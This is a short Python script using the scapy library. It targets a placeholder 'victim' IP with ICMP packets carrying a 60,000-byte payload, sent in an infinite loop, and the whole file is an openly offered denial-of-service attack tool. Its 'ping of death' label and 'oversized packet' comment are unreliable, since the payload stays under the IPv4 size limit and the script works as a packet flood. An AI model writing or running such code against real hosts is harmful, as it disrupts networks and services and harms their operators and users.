# ping_of_death.py
from scapy.all import *

# Define the target IP and the payload size
target_ip = "192.168.200.11"  # replace with the victim's IP
ping_payload = b"A" * 60000  # Example oversized packet (60000 bytes)

# Send the ping of death
def ping_of_death():
    print(f"Sending Ping of Death to {target_ip}")
    packet = IP(dst=target_ip)/ICMP()/ping_payload
    send(packet, loop=1, verbose=0)  # Infinite loop to keep sending packets

if __name__ == "__main__":
    ping_of_death()
